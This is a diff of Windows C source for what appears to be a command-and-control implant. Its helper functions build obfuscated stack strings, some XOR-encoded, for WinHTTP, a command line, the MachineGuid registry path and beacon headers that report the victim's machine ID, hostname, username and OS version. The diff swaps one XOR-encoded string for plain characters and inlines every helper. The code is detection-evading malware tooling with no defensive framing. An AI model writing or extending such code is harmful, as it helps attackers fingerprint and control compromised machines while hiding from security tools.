@@ -4,13 +4,10 @@
 #include "protocol.h"
 
 #define STRLEN_BYTES_WINHTTP 22
-#define STACKSTR_KEY_REG 0x37
 #define STACKSTR_KEY_HASH 0x4E
 #define STACKSTR_KEY_GETW 0x7A
 
-
-
-static VOID StrWinhttp(PWCHAR buf)
+static inline VOID StrWinhttp(PWCHAR buf)
 {
     *(volatile WCHAR *)&buf[0] = L'w'; // w
     *(volatile WCHAR *)&buf[1] = L'i'; // i
@@ -26,7 +23,7 @@ static VOID StrWinhttp(PWCHAR buf)
     *(volatile WCHAR *)&buf[11] = L'\0'; // null terminator
 }
 
-static VOID StrUserAgent(PWCHAR buf)
+static inline VOID StrUserAgent(PWCHAR buf)
 {
     *(volatile WCHAR *)&buf[0] = L'm'; // M
     *(volatile WCHAR *)&buf[1] = L'i'; // i
@@ -50,7 +47,7 @@ static VOID StrUserAgent(PWCHAR buf)
 
 
 
-static VOID StrCmdline(PWCHAR buf)
+static inline VOID StrCmdline(PWCHAR buf)
 {
     *(volatile WCHAR *)&buf[0] = L'c'; 
     *(volatile WCHAR *)&buf[1] = L'm'; 
@@ -82,46 +79,43 @@ static VOID StrCmdline(PWCHAR buf)
 }
 
 
-static VOID StrRegPath(PCHAR buf)
+static inline VOID StrRegPath(PCHAR buf)
 {
-    volatile UINT32 key = STACKSTR_KEY_REG;
-    *(volatile CHAR *)&buf[0] = (0x64u ^ key);
-    *(volatile CHAR *)&buf[1] = (0x78u ^ key);
-    *(volatile CHAR *)&buf[2] = (0x71u ^ key);
-    *(volatile CHAR *)&buf[3] = (0x63u ^ key);
-    *(volatile CHAR *)&buf[4] = (0x60u ^ key);
-    *(volatile CHAR *)&buf[5] = (0x76u ^ key);
-    *(volatile CHAR *)&buf[6] = (0x65u ^ key);
-    *(volatile CHAR *)&buf[7] = (0x72u ^ key);
-    *(volatile CHAR *)&buf[8] = (0x6Bu ^ key);
-    *(volatile CHAR *)&buf[9] = (0x7Au ^ key);
-    *(volatile CHAR *)&buf[10] = (0x5Eu ^ key);
-    *(volatile CHAR *)&buf[11] = (0x54u ^ key);
-    *(volatile CHAR *)&buf[12] = (0x45u ^ key);
-    *(volatile CHAR *)&buf[13] = (0x58u ^ key);
-    *(volatile CHAR *)&buf[14] = (0x44u ^ key);
-    *(volatile CHAR *)&buf[15] = (0x58u ^ key);
-    *(volatile CHAR *)&buf[16] = (0x51u ^ key);
-    *(volatile CHAR *)&buf[17] = (0x43u ^ key);
-    *(volatile CHAR *)&buf[18] = (0x6Bu ^ key);
-    *(volatile CHAR *)&buf[19] = (0x74u ^ key);
-    *(volatile CHAR *)&buf[20] = (0x45u ^ key);
-    *(volatile CHAR *)&buf[21] = (0x4Eu ^ key);
-    *(volatile CHAR *)&buf[22] = (0x47u ^ key);
-    *(volatile CHAR *)&buf[23] = (0x43u ^ key);
-    *(volatile CHAR *)&buf[24] = (0x58u ^ key);
-    *(volatile CHAR *)&buf[25] = (0x50u ^ key);
-    *(volatile CHAR *)&buf[26] = (0x45u ^ key);
-    *(volatile CHAR *)&buf[27] = (0x56u ^ key);
-    *(volatile CHAR *)&buf[28] = (0x47u ^ key);
-    *(volatile CHAR *)&buf[29] = (0x5Fu ^ key);
-    *(volatile CHAR *)&buf[30] = (0x4Eu ^ key);
-    *(volatile CHAR *)&*(volatile WCHAR *)&buf[31] = 0;
+    *(volatile CHAR *)&buf[0] ='S';
+    *(volatile CHAR *)&buf[1] = 'O';
+    *(volatile CHAR *)&buf[2] = 'F';
+    *(volatile CHAR *)&buf[3] = 'T';
+    *(volatile CHAR *)&buf[4] = 'W';
+    *(volatile CHAR *)&buf[5] = 'A';
+    *(volatile CHAR *)&buf[6] = 'R';
+    *(volatile CHAR *)&buf[7] = 'E';
+    *(volatile CHAR *)&buf[8] = '\\';
+    *(volatile CHAR *)&buf[9] = 'M';
+    *(volatile CHAR *)&buf[10] = 'i';
+    *(volatile CHAR *)&buf[11] = 'c';
+    *(volatile CHAR *)&buf[12] = 'r';
+    *(volatile CHAR *)&buf[13] = 'o';
+    *(volatile CHAR *)&buf[14] = 's';
+    *(volatile CHAR *)&buf[15] = 'o';
+    *(volatile CHAR *)&buf[16] = 'f';
+    *(volatile CHAR *)&buf[17] = 't';
+    *(volatile CHAR *)&buf[18] = '\\';
+    *(volatile CHAR *)&buf[19] = 'C';
+    *(volatile CHAR *)&buf[20] = 'r';
+    *(volatile CHAR *)&buf[21] = 'y';
+    *(volatile CHAR *)&buf[22] = 'p';
+    *(volatile CHAR *)&buf[23] = 't';
+    *(volatile CHAR *)&buf[24] = 'o';
+    *(volatile CHAR *)&buf[25] = 'g';
+    *(volatile CHAR *)&buf[26] = 'r';
+    *(volatile CHAR *)&buf[27] = 'a';
+    *(volatile CHAR *)&buf[28] = 'p';
+    *(volatile CHAR *)&buf[29] = 'h';
+    *(volatile CHAR *)&buf[30] = 'y';
+    *(volatile CHAR *)&buf[31] = 0;
 }
 
-
-
-static VOID StrMachineGuid(PCHAR buf)
+static inline VOID StrMachineGuid(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'M';
     *(volatile CHAR *)&buf[1] = 'a';
@@ -137,7 +131,7 @@ static VOID StrMachineGuid(PCHAR buf)
     *(volatile CHAR *)&buf[11] = 0;
 }
 
-static VOID StrEnvUrl(PCHAR buf)
+static inline VOID StrEnvUrl(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'W'; // W
     *(volatile CHAR *)&buf[1] = '_'; // _
@@ -147,7 +141,7 @@ static VOID StrEnvUrl(PCHAR buf)
     *(volatile CHAR *)&buf[5] = '\0'; // null terminator
 }
 
-static VOID StrCommitDefault(PCHAR buf)
+static inline VOID StrCommitDefault(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_HASH;
     *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
@@ -163,7 +157,7 @@ static VOID StrCommitDefault(PCHAR buf)
 
 
 
-static VOID StrGetMethodW(PWCHAR buf)
+static inline VOID StrGetMethodW(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GETW;
     *(volatile WCHAR *)&buf[0] = (0x3Du ^ key);
@@ -172,7 +166,7 @@ static VOID StrGetMethodW(PWCHAR buf)
     *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
-static VOID StrHdrApiVersion(PCHAR buf)
+static inline VOID StrHdrApiVersion(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -203,7 +197,7 @@ static VOID StrHdrApiVersion(PCHAR buf)
 
 
 
-static VOID StrHdrNameId(PCHAR buf)
+static inline VOID StrHdrNameId(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -228,7 +222,7 @@ static VOID StrHdrNameId(PCHAR buf)
     *(volatile CHAR *)&buf[20] = 0;
 }
 
-static VOID StrHdrPlatform(PCHAR buf)
+static inline VOID StrHdrPlatform(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -260,7 +254,7 @@ static VOID StrHdrPlatform(PCHAR buf)
     *(volatile CHAR *)&buf[27] = 0;
 }
 // "X-Agent-Capabilities: 0100000000000000\r\n"
-static VOID StrHdrCaps(PCHAR buf)
+static inline VOID StrHdrCaps(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -308,9 +302,8 @@ static VOID StrHdrCaps(PCHAR buf)
 }
 
 //"X-Agent-Machine-Uuid: "
-static VOID StrLblUuid(PCHAR buf)
+static inline VOID StrLblUuid(PCHAR buf)
 {
-    volatile UINT32 key = 0x1F;
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
     *(volatile CHAR *)&buf[2] = 'A';
@@ -336,7 +329,7 @@ static VOID StrLblUuid(PCHAR buf)
     *(volatile CHAR *)&buf[22] = 0;
 }
 
-static VOID StrLblHostname(PCHAR buf)
+static inline VOID StrLblHostname(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -359,7 +352,7 @@ static VOID StrLblHostname(PCHAR buf)
     *(volatile CHAR *)&buf[18] = 0;
 }
 
-static VOID StrLblUsername(PCHAR buf)
+static inline VOID StrLblUsername(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -382,7 +375,7 @@ static VOID StrLblUsername(PCHAR buf)
     *(volatile CHAR *)&buf[18] = 0;
 }
 
-static VOID StrLblOsVersion(PCHAR buf)
+static inline VOID StrLblOsVersion(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -408,7 +401,7 @@ static VOID StrLblOsVersion(PCHAR buf)
 }
 
 // "X-Agent-Build: ""
-static VOID StrLblBuild(PCHAR buf)
+static inline VOID StrLblBuild(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
     *(volatile CHAR *)&buf[1] = '-';
@@ -428,7 +421,7 @@ static VOID StrLblBuild(PCHAR buf)
     *(volatile CHAR *)&buf[15] = 0;
 }
 
-static VOID StrLblCommit(PCHAR buf)
+static inline VOID StrLblCommit(PCHAR buf)
 {
     volatile UINT32 key = 0x5B;
     *(volatile CHAR *)&buf[0] = (0x03u ^ key);
@@ -450,7 +443,7 @@ static VOID StrLblCommit(PCHAR buf)
     *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
 }
 
-static VOID StrValArchX64(PCHAR buf)
+static inline VOID StrValArchX64(PCHAR buf)
 {
     volatile UINT32 key = 0x24;
     *(volatile CHAR *)&buf[0] = (0x7Cu ^ key);
@@ -508,7 +501,7 @@ static VOID StrValArchX64(PCHAR buf)
     *(volatile CHAR *)&*(volatile WCHAR *)&buf[52] = 0;
 }
 
-static VOID StrValArchI386(PCHAR buf)
+static inline VOID StrValArchI386(PCHAR buf)
 {
     volatile UINT32 key = 0x37;
     *(volatile CHAR *)&buf[0] = (0x6Fu ^ key);
@@ -562,7 +555,7 @@ static VOID StrValArchI386(PCHAR buf)
     *(volatile CHAR *)&*(volatile WCHAR *)&buf[48] = 0;
 }
 
-static VOID StrValArchArm64(PCHAR buf)
+static inline VOID StrValArchArm64(PCHAR buf)
 {
     volatile UINT32 key = 0x35;
     *(volatile CHAR *)&buf[0] = (0x6Du ^ key);
